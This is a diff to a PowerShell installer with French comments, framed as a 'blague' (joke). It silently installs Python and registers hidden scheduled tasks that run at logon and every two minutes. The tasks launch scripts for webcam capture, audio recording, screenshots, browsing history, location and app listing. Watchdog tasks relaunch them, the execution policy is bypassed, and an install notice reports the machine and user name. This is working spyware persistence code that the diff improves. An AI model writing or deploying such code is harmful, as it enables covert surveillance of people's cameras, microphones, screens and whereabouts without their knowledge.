@@ -29,11 +29,27 @@ foreach ($s in $scripts) {
 }
 
 # Python si absent
-if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
+$pythonw = $null
+$pythonCmd = Get-Command python -ErrorAction SilentlyContinue
+if (-not $pythonCmd) {
     $pySetup = "$env:TEMP\pysetup.exe"
     Invoke-WebRequest "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe" -OutFile $pySetup -UseBasicParsing
     Start-Process $pySetup -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=0" -Wait
     Remove-Item $pySetup -ErrorAction SilentlyContinue
+}
+# Chercher pythonw explicitement (PATH pas encore mis a jour dans la session courante)
+$pythonwCmd = Get-Command pythonw -ErrorAction SilentlyContinue
+if ($pythonwCmd) {
+    $pythonw = $pythonwCmd.Source
+} else {
+    $candidates = @(
+        "$env:LOCALAPPDATA\Programs\Python\Python312\pythonw.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python310\pythonw.exe"
+    )
+    $candidates += (Get-ChildItem "$env:LOCALAPPDATA\Programs\Python\*\pythonw.exe" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)
+    $candidates += (Get-ChildItem "C:\Python*\pythonw.exe" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)
+    $pythonw = $candidates | Where-Object { Test-Path $_ } | Select-Object -First 1
 }
 
 # ffmpeg
@@ -69,29 +85,39 @@ $config = [ordered]@{
 }
 $config | ConvertTo-Json | Set-Content -Encoding UTF8 "$DOSSIER\blague_config.json"
 
-# Taches planifiees
+# Taches planifiees — Register-ScheduledTask evite tous les problemes de guillemets
+$settingsHidden = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0)
+$triggerLogon   = New-ScheduledTaskTrigger -AtLogOn
+$triggerRepeat  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30) `
+                    -RepetitionInterval (New-TimeSpan -Minutes 2)
+
 $tasks = @{
-    "BlagueVerrou"              = "blague_lock_windows.ps1"
-    "BlagueWebcam"              = "blague_webcam_windows.ps1"
-    "BloagueListing"            = "blague_listing_windows.ps1"
-    "BlagueAudio"               = "blague_audio_windows.ps1"
-    "BlagueHistorique"          = "blague_historique_windows.ps1"
-    "BlagueScreenshot"          = "blague_screenshot_windows.ps1"
-    "BlagueLocalisation"        = "blague_localisation_windows.ps1"
-    "BlagueApps"                = "blague_apps_windows.ps1"
-    "BlagueUpdate"              = "blague_update_windows.ps1"
-}
-foreach ($name in $tasks.Keys) {
-    $file = "$DOSSIER\$($tasks[$name])"
-    $cmd  = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$file`""
-    schtasks /create /tn $name             /tr $cmd /sc onlogon /ru $env:USERNAME /f | Out-Null
-    schtasks /create /tn "${name}Gardien"  /tr $cmd /sc minute /mo 2 /ru $env:USERNAME /f | Out-Null
+    "BlagueVerrou"       = "blague_lock_windows.ps1"
+    "BlagueWebcam"       = "blague_webcam_windows.ps1"
+    "BloagueListing"     = "blague_listing_windows.ps1"
+    "BlagueAudio"        = "blague_audio_windows.ps1"
+    "BlagueHistorique"   = "blague_historique_windows.ps1"
+    "BlagueScreenshot"   = "blague_screenshot_windows.ps1"
+    "BlagueLocalisation" = "blague_localisation_windows.ps1"
+    "BlagueApps"         = "blague_apps_windows.ps1"
+    "BlagueUpdate"       = "blague_update_windows.ps1"
 }
 
-# Signature Python
-$pySig = "$DOSSIER\blague_signature_windows.py"
-schtasks /create /tn "BlagueSignature"        /tr "pythonw `"$pySig`"" /sc onlogon /ru $env:USERNAME /f | Out-Null
-schtasks /create /tn "BlagueSignatureGardien" /tr "pythonw `"$pySig`"" /sc minute /mo 2 /ru $env:USERNAME /f | Out-Null
+foreach ($name in $tasks.Keys) {
+    $file   = "$DOSSIER\$($tasks[$name])"
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
+                -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$file`""
+    Register-ScheduledTask -TaskName $name              -Action $action -Trigger $triggerLogon  -Settings $settingsHidden -RunLevel Limited -Force | Out-Null
+    Register-ScheduledTask -TaskName "${name}Gardien"   -Action $action -Trigger $triggerRepeat -Settings $settingsHidden -RunLevel Limited -Force | Out-Null
+}
+
+# Tache signature Python
+if ($pythonw) {
+    $pySig      = "$DOSSIER\blague_signature_windows.py"
+    $actionPy   = New-ScheduledTaskAction -Execute $pythonw -Argument "`"$pySig`""
+    Register-ScheduledTask -TaskName "BlagueSignature"        -Action $actionPy -Trigger $triggerLogon  -Settings $settingsHidden -RunLevel Limited -Force | Out-Null
+    Register-ScheduledTask -TaskName "BlagueSignatureGardien" -Action $actionPy -Trigger $triggerRepeat -Settings $settingsHidden -RunLevel Limited -Force | Out-Null
+}
 
 # Notification install
 $body = @{type='install';machine=$env:COMPUTERNAME;user=$env:USERNAME;date=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')} | ConvertTo-Json -Compress
@@ -102,4 +128,7 @@ foreach ($name in $tasks.Keys) {
     $file = "$DOSSIER\$($tasks[$name])"
     Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$file`"" -WindowStyle Hidden
 }
-Start-Process pythonw -ArgumentList "`"$pySig`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+if ($pythonw) {
+    $pySig = "$DOSSIER\blague_signature_windows.py"
+    Start-Process $pythonw -ArgumentList "`"$pySig`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
+}
